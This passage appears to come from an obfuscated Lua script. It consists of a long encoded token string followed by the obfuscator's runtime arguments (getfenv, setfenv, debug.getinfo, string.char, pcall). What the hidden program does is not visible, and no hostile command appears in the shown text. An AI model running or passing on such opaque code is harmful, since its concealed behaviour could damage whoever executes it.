3OE63O3J3OKY3O3E3O3M3LUM3OED3NFS3LUR22W3OO43LUU3OEI3MA63OEK3NG03LV33ONN3MA43NG53OEQ3LVC3O483NSO3MOI3OEV3O4F3NSV3H3A3NSX3OEP31AH3OF23LVW3NT33LW03OF63NT63OM03OFB22X3OFD3E4P3LWC3NTD3O4X3OM03NTI3MQB3OFM3MBM3OFP3OM03NTR3O5D3OFT3MBW3NTW3OMN3O5E33463NHM2UK3NU13H3A3NU33NTY3OM03OG73O5V3O5O3MCG3OGC3OM03O5W33463NUG2UK3NUI3H3A3NUK3O5N3OM03OGM33463N5R311R3NIC3OGQ3NUT3OM03NIH3LYT3O6C3OGY3NV03NIN3OPA3MRZ3LYV3OH43LYZ34OI3N6F3BC533UG3ONX3OH33LZ73OHC3MDU3OHF3OP23MDQ3M3P3NJA311R3NJC3OHM3NVS3OMN3N7333VM3N75311R3NJK3OHV3NVZ3OOH3OS73OI13M0831KJ3MEO3O7I367L3OI73B8U318U3OKR33493NK13N823OID3HJC3NK63OIG3OOV3M0W3NKC3O7X3LKN3O7Z3NKH3ORX3OIQ3N8D3OIS3M1C3OIU3O873OMN3NKT3LLJ3NX53M1O3OJ33MUN3N8W3NXD3OJ83O8M3OJA329Q3MUY3OJD3NLD3OJF3NXN3OJH3M273OJK3M2K3O923H3A3NLP3OTT3OM03NLU33493MVJ311R3N9P3H3A3N9R3M2I3ONF3O9D3MW23NY73LMZ3O9H3NYA3OMN3NMB3O9S3OK73LNB3O9Q3OM03NYK3MHZ3OKE344U3O9W3LNO3ONF3OA03NN03OKM3M443NMY3OM03NAX3MX63OKU3OAC3H3A3NN63MI13ONF3NB633493MX8311R3NB93NZB3NNF3OMN3NNI3OLE3OAP3OLA3H3A3NNN3OAN3ORR3NNJ3LP33OLG3OAY3NZS3OB03OP33OAV3MY33NO33OB53OLQ3OB73OMN3OB93OBB3O0A38WI3O0C3MJJ3OKI3OBI3O0G3OBK3LQ43OM53OBN3OSO3O0M3O0U3OBR3LQG3NOX3O0R3OSW3NP23LQY3OMJ3M6M3O0Z3OVU3OMP3ND63GAL3ML53OC93OMN3NDC3NPU3OCD3OMZ3H3A3NPQ3OCB3MVG3ON33O1J2UK3O1L3H3A3O1N3O1H25S3M7C3NQ33OCQ3O1U3H3A3O1W3OXF3OM03O203OCW3FDQ3NE63LSI3ONF3ONP3MMQ3ONR3NQO3LST3ONF3NQS3N1G3OO03M8K3ODD3OMN3N1H3MNC3ODI3OO83H3A3NR83M8G3ONF3OOC22X3N1T311R3NF13ODQ3NRI3OM03N223NRS3OOK3M9E3ODZ3OM03OE13OE33HPT3OOS38WI3OE73OOP3OM03NS23OP43OOY3LUO3NS73OEF3OMN3NSC33463NFX311R3NFZ3O3Y3NSH3OVN3OZ73OPC3NSL3OPE3H3A3O493OPB3OVU3OPI3MUG3OPK38WI3OPM3MOW3ORI3N3F3OF33MPJ3OF53H3A3OF73O4L3OSD3LW63O4T3LWA3O4V3MPW3O4X3OWF3OPX3O503LWM3O523OFO3O543OSW3OQA22X3N4L311R3NHF3OFV3NTW3OVU3OQG22X3OQI3O4V3LXB3OG43O5J3OMN3OQP22X3N56311R3NHW3OGB3NUC3MR53OGG3O5Y3LXZ3OGJ3O612IT3NUO3LY73OGO3NUS3LYE3ONF3ORC22X3NUX3GJX3LYN3ORG3OH03OM03OH23N6Q3NIS3ORM3H3A3ORO3O6I3OM03O6P22X3NVF2UK3NVH38WI3NVJ3NVD3OMN3OHI33463OS02UK3OS23H3A3OHN3ORY3OM03OS63MT53NVW3OHU3H3A3OHW3NVO3OM03O7C22X3O7E3OI33D5K3OSJ33NN3OSL3BC5318U3OM03OSQ3N893OSS3NWG38WI3NWI342J2H53OM03MTT3NWU3OIK3O7Y3OIM3O803OZS3LKU3OIR3LKZ3NKN3N8H3LL43OJW3O8A3MUF3OJ03NX638WI3NX83O8A3OVU3MUO3NLA3OTI3LM13NL63N8N3OMN3O8P3LM63OJE3LM13O8V3BC531P23P003OJJ3O903OTV3OJM3OTX3O943P073OU13NM23NXZ3OJT3O9A3OJV3OSW3OUA22X3N9X2UK3NM53OK13O9I3OVU3OUH33463NMD2UK3NMF38WI3NMH3NYC3OMN3OUN3LNR3OUP3LNM3OKH3N3X3OUU33463NAP311R3NAR3OA43NMY25U3OV63OKT3M4C3OKV3OV43OAE3MSU3OV83MIW3OL13NNE3LON22W3L0I3NZG3OL83OVI3NZK3LOZ3OFQ3OAU3OAW3NZR38WI3NZT3NZN25W3OB23O063OB43OLP3O013OLR3MPF3OW23OLW3OBD3O0B3OBF25X3OW93OMF3OWB3M623O0K3MVG3OM83LG83O0O3OWJ3OMD3O0R34DJ3NCN3OBX3M6K3OBZ3ND03LQV3OEG3OWT3LR23OWV3MZL3OC92FN3NPL3O1H3OMY3M763OCG3O1H3LRN3OCJ3M7G3NQ034VO3OCO3O1S3OXH3OND3M7S3OAF3OXN3ONI3OXP3O253OXR24P3O293NEB3O2B3ONS3H3A3ONU3O293OD83ONZ3LSZ3ODB3N1B3ODD24Q3OYB3ODH3M8S3ODJ3NEU3LTF3NVT3OYD3OYF2UK3OYH3H3A3O313OO624R3NRQ3OOJ3M9C3ODX3H3A3NRP3ODU3NFE3OOQ3LUA3O3G3M9O3O3J34XO3NFN3OOX3M9W3OOZ3OZ33OP13N2V3OP53MON3OP73OZB3OP93LJW3OEO3OZR3OZG3MAI3OET3OEP3LVK3OZN3OEY3MPB3O4J3CME3NGM3OPQ3O4N3OPS3OZX3NT6335B3NT83LW83O4U3OQ03OFG3O4X24G3O4Z3OFL3P0A3OFN3H3A3NTN3O4Z3MSU3P0F3P0H2UK3P0J3H3A3OFW3MBI22W34H13NHD3LX73O5G3P0R3OQL3OG53P9Y3NHL3N553OQR3MR13OGC3PA53OGF3NI23P143MCQ3OGK3MOI3OR422X3OR62UK3OR83H3A3OGR3MCM22W2U83O6A3O6I3OGX3P1J3O6E3ORH3PAT3NIQ3ORK3P1P3MDK3NVB3PAZ3ORS3ORY3LZ93O6S3OHE3O6U3MPF3P243MSV3O6Z3OHL3P293NVS32DQ3OHR3NW13OHT3MEE3NVZ3PBM3O7B3OSF3MEM3OSH3MTB3P2Q33A03P2S33TD318U3PBS3OSP3NWD3O7P3OST3O7R3M0T3O4R3P353P3C3P373OT03P393OT224K3NWM3OT53P3E3OIT38WI3OIV3OIQ3PCC3NKL3P3K3M1M3OJ13NX73OJ33PCN3N8V3O8J3M1X3O8L3N903O8N3MLU3P3Y3O8R2UK3O8T363E3P423NXC311F3O8Z3OU83OJL3M2M3O943PD93P4D3N9V3P4F3LMO3NY23PDG3N9V3LMV3O9F3OUD3P4P3NYA3N3X3P4S3NAD3OUJ3M3K3P4Y3OK531153NYR3OKD3O9U3OUQ3OKG3OUS3MSU3P573MWV3OA23OUX3LO022W24N3P5F3NNA3OV23M4E3OAE3MOI3P5M22X3OVA2UK3OVC3OL33NNF3CWG3P5T3NZU3P5V3OAR3P5X3MPF3P5Z3OVQ3OLI3LPA22W3CTA3MJ83OVW3P683M5I3OLR3MVG3P6D3LPR3OLX3NCA3LPW33HO3P6J3NOT3P6L3MK93O0K3MLU3P6P3OMA3DSW3P6S38WI3OME3NOT34WS3OBW3OMI3OBY3OMK3H3A3NP73O0U3NPA3O123OWU3OC73O163OC932783P793MLC3OX13P7C3LRI3OAF3OX73P7G3NPZ3LRU3FK33OXF3OCP3M7O3OCR3N0H3NQ73MOI3P7Q3LSD3P7S3OCY3O263G0A3NE23OD33MMJ3OD53NEE3OXX3MPF3OXZ3O2I3NQ53OO13O2L3ODD34XX3ODG3OO63OY73M8U3O2U3N1Q3ODN3M923O2Z3P8L3ODR24W3P8P3OE83OYN3MNS3ODZ3MLU3OYR3OOR3P903LUF22W32DE3P933NFV3OZ13M9Y3OEF3N3X3OZ622X3OZ82UK3OZA3H3A3O3Z3NFV34V03P9G3O4D3P9I3NSN3LVF3OAF3OZM3OEX3O4H3OPL3O4J34J33OPP3OFI3P9U3MB23NT63MOI3OPW3OPY3OFF38WI3OFH3NT82RP3OFK3PAK3PA83OQ73O543MPF3PAE3OQC3MQH3NTW33683PAN3MC23PAP3MC63OG53MVG3P0V3P0X2UK3P0Z3H3A3O5R3PK02523O5N3PB13MCO3OGI3OR03OGK3MLU3PB63PB833MX3OGP3PBB3NUT2533OGV3PBH3MD83ORF3PBK3OH03N3X3P1N33463NV7311R3NV93ORN3NVB378Q3OHA3ORT3PBV3OHD3NVI3ORW3LTT3O6X3NVO3PC23ME43NVS33W93PC73OI03PC93MT03NVZ3MSU3P2L3P2N3PCG3N7I3M0D3KIE3M0G3OI8312I3P323PCP3P2Y3MF13OIG3PLC3OSX3NWM3PCX3M123P3A3PLI3NWU3PD3342O3P3F3NWZ3P3H3MOI3OTB3N8V3P3L3OTE3O8G2H33OJ53MUY3OJ73P3U3O8N3PM33PDO3P403M3K3PDT3MUY3PM93NXQ3PDX3P483PDZ3NXV3MPF3PE23OU32UK3OU538WI3OU73NXX350K3NY53PE93OUC3M393O9I3PM33PEF3P4U3CJD3OK83O9P3M3M3PMY3P4T3O9T3M3S3OKF3NMP3OKH3NAM3NYU3M423NYW3NAS3PEX23X3PF03MIC3OAB3PF33NZ53PM33PF63PF834HO3OL238WI3OL43PO43PNP3PF73OAO3M4W3OAQ3MXM3NZL3MLU3PFK3LP53OLH3MJC3OB023Y3P663OW73PFS3MJN3OLR3PM33PFW3M5Q3PFY3OBE3PG03POG3NOJ3LQA3O0H3OWC3H3A3NOP3OBI3N3X3PG83P6R3M6C3O0R23Z3O0U3PGH3P6Y3PGJ38WI3PGL3OBW32BV3OMU3LR03PGP3M6W3OC93K843PGU3NDD3PGW3O1E3PGY3PPQ3PPY3P7F3ON53OCK3OXB3NQ02PW3P7K3ONM3P7M3OCS3ONE315A3ONM3LSB3P7R3O243PHF3OXR3PQ23PHI3P7X3OD43P7Z38WI3P813OD223O3O2N3P843M8I3P863NEM3LT43P863OO53MN33OO73PHZ3P8F3D6Y3PR33LTK3O2Y3ODP3PI53NRI3HGR3OOI3PI93P8R3OOL3P8T3ODZ31LE3OOP3LU83PIF3MO33O3J350C3PIK3MOA3OEC3OZ23O3P3OEF339X3PRT3LUW3O3W3MA83NSH2EQ3PIZ33493O452UK3O473OZI3NSO327Z3OZR3P9M3PJ63OEZ3LVR22W2I33PJB3NT83PJD3MPL3NT62R23P9Z3O4Z3P033PA23PJK3O4X3KSM3PJO3N4J3PJQ3MQ63OFP338Q3O563NTY3NTT3OFU3PAI3NTW350E3OG03PAO3OG23PAQ38WI3OQM3OG034ZG3O5M3OGF3OG93O5P3PK93OGC34YU3PB03PBD3PB23MRB3OGK329L3P193O6G3O653PKN38WI3PBC3NUO2443PKR3MRZ3PBI3MDA3ORH2453O6I3PBO3O6K3P1Q38WI3P1S3MRZ2463NVD3PL73MDS3PBW3PLA3O6U33R93MSB3ORZ3OHK3PLG3LZQ33VS3OHJ3OHS3MEC3O773OSB3O79350R3P2E3M063OI23PLR3O7H3PLT3ITZ3PCK342J3KXV36WA3M0K3OIC3M0O3PCR3OIF3PCT3PQM3N893OSY3PM63MFB3P3A3PQ93PMA3NX93PD43OT73PD63O873BOG33VM3PMH363O3PMJ3MFV3OJ32303PVB363O3PDI3MG33PDK3NL53O8N3PSC3OJC3OTT3OTP3P413NXO350G3PDW3NXX3PDY3MGP3O943PVI3MVH3OJR3PE43M3K3PNA3O962323PW33P4K3P4M37Q53PEB38WI3OK23NY53LY43NA43M3O3PEH3MHJ3O9Q36IN3PEM3NYT3PEO3P543OUS22O3PW33PET3P592UK3P5B3OKO3NMY3PWA3NN03P5G3MIE3P5I38WI3OV53NZ0340F3OKZ3NZG3P5O3OAK3P5Q3PW23PFE3NZN3PFG3POL3P5X3PY03NBF3OLF3POP3OVR3P623OB03PXM3NNS3PFR3M5G3OVY3P6A3OB73PXE3OW73OLV3PFX3P6F3OW53OBF334U3MYM3OWA3OM33PP938WI3PPB3MYM335K3NOT3O0N3OWI3PPG3LQJ3OEK3OMH3O183PGI3OWQ3P713M3Y3P733M6U3P753ND83LR73KVK3PPX3OX03P7B3PQ03M7834ZI3PGV3PQ43M7E3ON63NDP3PH33KW43PQA3ONB3PQC3PH93ONE3M323PHC3M7Y3PHE3ONK3O263M843PHJ3N0Z3PHL3ONT3NQP3PYK3ONQ3PQW3MMU3PQY3OO23PR03PTH3N173O2Q3PHY3O2T3P8F36AK3MNC3PR93OOE3MNH3ODR3M243OYL3LU63O373PRI38WI3P8U3NEZ3M9I3P8X3M9M3P8Z3PRP3PIH3Q0C3O3L3PIL3P953PRV38WI3O3Q3NFN3PU83PRZ3OPB3OEJ3O3X3PIV3NSH22U3PW33O433PS63OPD3P9J3PJ33M0V3PJ53MAQ3P9O3N3J3O4J3M0V3NT13P013PSM3NT53O4Q3Q1933463PJH3PA13O4W3LWF22W3PRL3N403P093MBK3P0B3PAA3OFP22V3PW33PJU3PT53OQD3O5B3MC03OG13MC43OG33PAR3O5J3MCA3PAV3PTK3OQS3NUC3Q273P0W3P133PKF3P153PKH3O613PRY3O633P1A3PTX3CZ53OQQ3KZF3LJV3EZP3LJY35AC3ODJ31C63P1N33SR3MFI3KJ03PUC363E3PUE3N6A3LZ43P1V3P1X3NUR3PL93P203ORW3Q323PC03P263E4W3PC338WI3P2A3PUO3PTU3NJH3PUV3MSY3PUX3PUO35293OI43P2Q33BO2LW3L3533O23O7M3KOF36WA3FFC23F32IR2H53LJE2N52LW36NU27E2H535BY336G3PD73NWU3LKE3PDA3N8N3PVZ36YE2H524036942LW334Q3Q593L7A3J3H3G5D2H53LHX34IQ2H5246369434U03Q5L33RM2H53LJ335342H52313Q1O352W3Q5U3AB13Q5T37133H983F153L7D3E503HCW3KPA34Z83L5L23E23J3A7G3C0D2H53LIR39UC2H522R3Q5V34U03Q6H36183Q6D3DQ434702H52613Q5V352F3Q6Q3J2531PN1C3Q6R34733Q6W3Q6L3LIY33JV360D33OR32O73P3O35172I53D1I36J03LK33DR43LK6336E3EN538TU3CRI3P3G3M1F38VH3OIY3OTC3Q5636D62H521V3Q5V3Q5B33XQ3Q5V33L03Q4Y34YH2H521U3Q6X334Q3Q7Z3Q5P33N63LJW3Q5131C62TO3LK12P73Q7B32643Q7D3MUH38YI2LW35HS3CRE3MU523H2BP33LQ2LW3LJO34PK3CRI34M12383Q5V3Q813Q7U3M0K23I2BP33AH2LW3KXJ3P3C3Q8X37TE2MJ1A3Q5V34IM2R43LFN36IC31P2316I3Q8O3PWR31C63MHI31C63O9D3EUU3Q3O3PWX3CVO36113MVC3O943LNQ3PWN3OJX3PWP36YE2R42113Q5V31P235YI3Q972B53Q993DQ434VW31P233232H53Q9F3I863Q7937PI3Q8B3N9X3HQN3D1D3B1Y3Q9O3NXU3M2O3Q7K3N9M3PWO3O983P4G33XL2R43Q963KL6334Q3QAS33XS36B735342R421F3Q80336N3QB033RM3QAX27A3LJW3OTY34D43LMG33US3OU1358O3Q8D3PN833TA3N953Q8I3MVH3Q8K33OC31P23HK533V33Q9O34M13Q9X34U03QB3375V3Q8T34UC34Q33LAF22U34PZ34XZ34XU3QBX22W193QBZ34XU34Q7338N3Q5V34QB2H521Z3Q8T336N3Q6T3NWC3Q9327A3Q8Z31373NKQ2LV340A33AO2H52603QA132643Q6E33XS31P236II3QB539QW3M252TN2BP29R3LLT3LBV3CIC3Q3I37Q53LOD3I863Q8B3OU33DR43QAP36KQ2R426J3Q9Y34733QDH3QB439QQ2R426I3QB12O13Q7U33JM3QB522W3QB73N6P3HQN3Q893QBC37PI3QBE3O9935023QBH3OU83QBK3AMG3QBM33VQ3QBP352W1S3QCE3QDQ36183QA338CI35Z23Q9C3KVR363O36IK3LLV3QD127D3QD33FGX32O73QB83517315K3QD93CJD3QDB3Q9L3PN833SD2R426R3QDI334Q3QF33QEF33GF318I3QA53361339S3QCY3NXC3Q6A3QEP32643G8F3LDU3QD73QEV3QBB3M0L3QBD3QES3QE23QDF3J603QF4336N3QCR3QDL37C02R425D3QDP27A3QFZ3QFW27E3QDV3QFK3CGK3Q9G3QFN3QE03QFP3QDE3QBG3L113QBI34YG3QE634PH3QE835693QEA352F3QF634733QG234733QFV28B3QBW34U734Y93QC634MU3QGT34UE35OU3QGW2473QC82BT3QCA34UM3Q6B103Q8V3Q6B39FE33BK3Q4S3DX73Q6O3PEY3QG03QHG34NI2H53QCI3IY53Q903Q7J3QCI33WU2H524M3QDR32643KM52H331P2330G34ID3FTY3L7M3F123Q8O32KK3QEL3H6Q34702R424L3QHH3QI933RM315K330P3LJW3PX0351731363Q893OUH3HR23Q8D3P4W33TA34YG37023QBI32B73QGH33LQ34YG3QAG34PK3Q7D34M124P3QED27A24K3Q6R350G3QI3330532K52H525T3QH93J3H3A1I3LII36UL34Z83Q4K34Z83Q4W3A1I2H5397L3HCA3L5L3KPT3K913HVI376D3HIE2S2344E34RX2R433A03O283CSA3LGN3LMG32IR3MUQ3Q893LM73QK33M0Z3QK534XB3QK7361L3QK92383QKB3HWO3QEU350Q3LDU3QKC33US3LMY3QKF3H6G3HJR34PM3QG823A32IR315K37023QDY3I6R33ZB3QJQ3Q9K3Q8D27E3QIV34WN34YG35YC336G31363QJS363E3QAE33ZB3QL33H8T3QL53O9P3QJ6336G3QLB358O3QLD3F0N3CJD33593FTQ3GKV3F123QJO34Z8355M34Z83L2W34Z83QJQ34Z83Q7F3OE93HCT3KNH3GKY3Q4W363E31363QBN3AO3383I3GHD3Q4K33VM3QJC34KX35283Q2L31PN334Q23D3QMH3KOC39QQ3MES3QMH3DP23QML33JM3KOI3PCL3B2L2BP33BK3KOF3AM033TA318U34CR3QBI2LW3QIT31EI3QJQ33LU3KJN34M12313QMH3CPX3QML3Q6A3BFZ319Z3KY93PLY2212BP3CCP3L373DX73PCO337Q35Z22H531LO36DD3NK432ES3ATQ318U3QNI3O7V3QNK27D3CCP3QN13HVR3N822233QMW3M0W31LO3DXM318U3P2Z3Q7V3D2I36WA32DQ2LW34RX2N53L3G3QO53ICS334S3Q4O371K3KJG3Q4U3HJC32583Q87369A32IR3Q8G3GEA3QOV3QNZ31C62I53QOR27E2TO32583Q8O2I53QI33A1I2R43ADS3OE93QLS3KRZ3A1I31X935JR3Q6434T72H331K23F0F3L7N3D7S3M3A34DM34Z83Q9O3QLR3A7Y31363QHV32G137C33QJN32ZY3IM23K1X3Q9K3534313621L3QMP34733QQ83ISU33GU378C34VF3NN0335F35742ZE31LO3LOP3OAG33AH35742HR31LO353K2UK3NN436CY32G03QPY3QQJ3QJF3KTJ3GKW3KI532Z23IM232G032YZ353T347032G01X3QQ9334Q3QR933AA2I53KQ234732133QMR336O3QCZ353Z354T3574353Z31LO3E05336G2VT3QRF37PI2HR354A3G5Y350G3D253KI432KK3QRI33GU3QCZ32G03K8X34303M3Z3KJK3PFB3QIW358O33GU353T3G5Y33WF3QRZ3K8M32G021X27C3A1I2ZE38HS2LR3Q673F153QJ6339X3LNP3FOZ31LN3Q6A33GU337B3D7S33GU334K3QHZ3JOJ3QR03QPP3FTS3QJQ33WF3GYP3D7S2ZE37CS3QT33QJU3QT53QKX3QTG3QRZ33O23Q6A2ZE3CPG3QTB2SR37CD34Z83QJ63QSQ3HCW3QT83BZV36WD2H3353Z337K3QTE3QTS3LFO3F123QRF3Q693POH3QTN3LH8353Z360M33WF3KQI3OBS3NBP3KYP35742OB31LO3CTW3A1I3LPX3QQY3H8C3F153QJO339X2VT3CTW3PM32OB22G3QO83QUI3D2L3E4X3M5N3QPS3GGT3HCW3QUQ3NZJ3QUT3O0333BK3QUH3I6R3QUK2H33M5F3QV23QUO3QV432ZY3QUR3POQ3GGI3NBP3F5X3QS73QUY3E0B3QV03CJD3QVF3OAJ3GKY3QV53QUS35U73MY222J3QUX3QVB3QVR336Z3QSP3QV33QVV3QVI3QV63QVY3NBP22K3QW13QUJ3QVR32B73QVT3KQC3QPV32Z23QVJ3QV73PFQ22L3QWD3QUZ3D7S33OJ3I2T3OE93QWI3FTS3QVW3QVK3QUU33243QWP3QVQ3QWR3IVX337O34Z83QWV3QPE3QW83QVX37113MY23AC73QVO3QW23QX337U93QW53QVG3QW73QWK3QW93QXB3NBP2283QX13QVK3QUL39JU3QX53QW63HCQ3QU327A3QWL3QWA3PYE3CYR3QVA3QWE3QX33LI23QXI3QVU3QXW3QT633A13QXM3QVL3PYE22A3QXQ3QVC3DSW39FK3QY73QX73QTT32O73QXZ3QXN3PYE22B3QYG3QVR2OB3QWH3QUP3QX93QWY3O033CMG33BK3QVP3QXR3QVD3DSW3QYV3QVH3QXL3QXA3QYD3OVV22D3QYS3QX336U03QWU3QYW3QZ83QYY3PFQ22E3QZD3D8633OJ33YU3QYK3QZH3QYN3QYC3QWZ382235Z23QZ23QYH3M6B3QZ63QXK3QZS3QZ93QWZ32LO3QZ13QXF3QZN3GAH3R003QY93QTH329F3QZT3O033A2F3QXE3QY43R0833XR3QTE3QYL3QXX3OE934DR3QYO3QZA3NC33QZM3QXS35OT3R0L3QZR3R0B3R0P3R0E3PFQ355Q3QY33QWQ3R0836K93R0W3QZ73GKY3R0Z3R033O03356D3R133QX23R083LIW3R173R013R0Y3QYX3QWM3MY22193R0T3QZ431HQ3QTQ3QXV3QTG3QPF373E27E3R0Q3QWZ36SK3QZW3R073QXS368K3R1I3R0B3R1V3A3O3R1Y3O0333LU3R1E3QZ33DSW3HJ13QZQ3R182N53R293PFQ35E13R2C3QZY3I1X3QXU3QXJ3R263R1L3QY03OVV3KU93R2M3QVR35WH3R2G3R1J3R1X3R103MY21Y3R1P3DSW31773R0A3R1U3R2S3QYP3OVV1Z3R3533OJ35W03R2Z3R2R3QZI3R1M3NBP2103R3E3D5A3R383QWJ3R023QZJ3MY22113R3N33QT3R3P3QWW3R3A3R0R33N43R3N3K733R3H3R393R3J3R2T2OB33DF3R2W3QX33D5L3R3X3QX83R463R3B2OB353B3R4A3R08373T3R443R3Q3R2I3R323NBP35TV3R4J3QXS34MG3R4D3QYM3R4O3R1B3PFQ21M3R3N3HJH3R4M3R3Y3R4F3R4036693R4S3QZ431U43R4V3R0N3R2J3MY23L0C3R583DSW33N03R2P3QY83R453R3R3R3K3PYE21P3R3N36V73QZG3R2H3R313R4Y3MY232HA3R5G33OJ3KIT3R533R4E3R5M3R4722W3IM23R5Y3NUR3R5B3QYA3R5D3NBP37J53R213R0I3QXS3HGM3R613R4W3R5U3R3S3NBP21D3R3N33SF3R6I3R5C3R4P3PYE21E3R3N35YO3R6Q3R6A3R6S3OVV21F3R3N34KS3R6X3R0C3QXY3R6Z2OB21G3R3N3HQV3R743QWX3R5N3OVV34KP3R6734JC3R5J3R0M3R6Y3R5V3NBP21I3R3N36AG3R7C3R3Z3QWZ21J3R3N35JF3R7J3R0X3R6K3R7E2OB356J3R67341S3R7R3R553QWZ3L3U3R6735Y83R853R633R4G3GTZ3R3N31UG3R693R753QYB3R7M3PYE3JYT3R0H3R143QXS35XA3R8B3R4X3R6L3PYE35RK3R063R6F3QZ434QD3R8R3R7Z3R6438203R8W3R8O3QZ42J03R8H3R7D3R641E3R3N3KKK3R903R0D3R8K3OVV3C7O3R943R1F3QXS2J23R983R7S3O03103R3N3L5Y3R9N3R863O0333SQ3R8N3R9K3QZ436N13R9E3R763R9G2OB123R3N3KL03R7X3R5T3R9F3R8T3OVV3A553R9J3R2D33OJ36MK3RA13R8J3RAB2OB3GPD3R9X3RAF22W312B3R9T3R8C3R403CI03RAE3R2N36C33FTS3R7K3R8I3R6B3PYE3C9R3RAN3R2N3KPQ3RAY3R7Y3RAA3R8036DH3R3N369L3RAI3RB13OVV3GUU3RAV3QVR3I093RBE3R773AET3R3N3L9K3RAR3R8S3RBA3FY33RBI3QX336073RB73RA93RA23RAK39BC3R3N34K13RBQ3R913R8D382H3RBU3R083LA53RC43RB93R6434MQ3R6E3R953DSW31E73RCB3RBZ3RBA1U3R3N36BI3RBL3RA334UO3R3N3EE23RCJ3RAJ3RBA3GLP3RCF3R9Y3DSW375U3R5S3R303RCC3R8D35R93RCY3RAO35ZW3RCP3RC01I3R3N29H3RCU3RBF2OB35VH3R6735YV3RDA3RBA1K3R3N38HX3RDF3RBM1L3R3N36O43RDL3R643CTR3R6728L3RDQ3RCQ3QMF3RB43QVR36OA3RDV3R8D34HE3R673LE13RE03RC026H3R3N2923REB3RBA26I3R3N2A53REG3R6426J3R3N37GB3REL3R8D26K3R3N32VJ3REQ3R4026L3R3N36XK3RD23R3I3RAS3QWZ3L613R6734NH3RA83RD33RCK3R6426N3R3N2F93REV3QWZ2683R3N39EO3RF73RF13RBR3R642693R3N28Q3RFE3O0326A3R3N361P3RFJ3R5L3RFL3R8D26B3R3N3NN93RFQ3PFQ26C3R3N376U3RBX3RF83RCV3R6426D3R3N34UP3RE63R4026E3R3N36D83RGE3QWZ26F3R3N32JS35O13QX63RB83FTS3KQ93FU33R9U3PFQ26W3R3N36CJ28Y3RGP3RBY3OE93RGS3GZK3RF93R8D26X3R3N361D3RGZ3R1T3R4N3QTG3RH33R1W3RD43R4026Y3R3N2LP3RGO3RHB3R543GKY3RHE3R283RBM26Z3R3N360R3RHA3R2Q3RFW3RHD3F153R1A3RC02703R3N336G3RHL3RHW3RHC3F123RHP3RI03RBA2713R3N1N3Q603RF03RHY3HCW34DR34Z83QL93R6J3RHG3QWZ3L513R673E1L27O3RH03RHO3RHZ3F153RIL3R6R3RCQ3L4O3R672F23AAC3RIT3R0B3RI93RIW3RGQ3RG93R8D26O3R3N37763RIS3RHM3RH23RIV3HCW3RIX3R7L3RC03L473R6733AW3RJ33RJF34Z83RJ63RJI3RJ83RDG3O9J3R3N34N43RJP3RI63RGR3RJH3GKY3RJJ3RB03RBM26R3R3N3E153RGJ3O0326S3R3N31613RG23MY226T3R3N36EZ3RKA3PFQ26U3R3N32VZ3RKF3NBP26V3R3N3KOT3RFV3RI73RH53R4025K3R3N3O053RKP3PYE25L3R3N3O0T3RL13OVV25M3R3N363A3RKK3MY225N3R3N3O283RL62OB25O3R3N325S3RLG3EWT3R3N389J3RJ43RHX3RIN3O033L833R6736EA3RLB3NBP25R3R3N2FB3R1S3RK03OE93DQI3RHN3RFX3R4025C3R3N36XU3RG73R0B3RM43R623RM63QWZ25D3R3N362Y3R253QTG3RMD3RIM3RKW3QWZ25E3R3N3KNM3RMK3F123RMM3RIY3RC025F3R3N36293RMT3FTS3RMV3RJK3RBA25G3R3N3KPF3RN13RM33RJU3RBM31VT3R673O7M3RM13R5K3RMU3RNB3RCQ25I3R3N317Y3RNG3RAZ3RN33RK53RCQ25J3R3N35TJ3RNO3F153RNQ3R993R8D2603R3N3O9K3RNW3HCW3RNY3R9O3PFQ2613R3N32023RO43GKY3RO63RGU3MY22623R3N3OAM3ROC3RMC3RNJ3RC02633R3N35JQ3ROK3RML3ROM3RBA2643R3N3OBH3ROR3RNI3RH13RJV2653R3N34T23RN934Z83ROE3RF23O033L763R672UX3ROY3RN23ROT3R643L6U3R672F43RPD3RNA3RP03RBM25S3R3N32633RPK3RP63RPF3R8D3L6E3R6734U93RLL25U3R3N2LB3RLL25V3R3N32973RLL25W3R3N34SH3RLW3PYE25X3R3N31213RLL25Y3R3N34QJ3RLB34VW2OB3OFZ31LN32J62OB25Z32IR3KQM32Z23KQS32ZY3G9V32O73D2X34QO332E35BT3L9R2W924O32IR2W932JJ3CV53A1I32DI31TJ3AA73RJG3HCW3KR834Z83RQS3FTS3QM53RMN3OE93RQU3F123RQW3OE93RQY37HT35EI344333WF3D3B3N0822W24P3QSL2H3327F3OGU3B4J3RRK3QLX3F153RRF3KRD3HCW3QUD3QI23QW8318U3CVT3IOU34DU',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
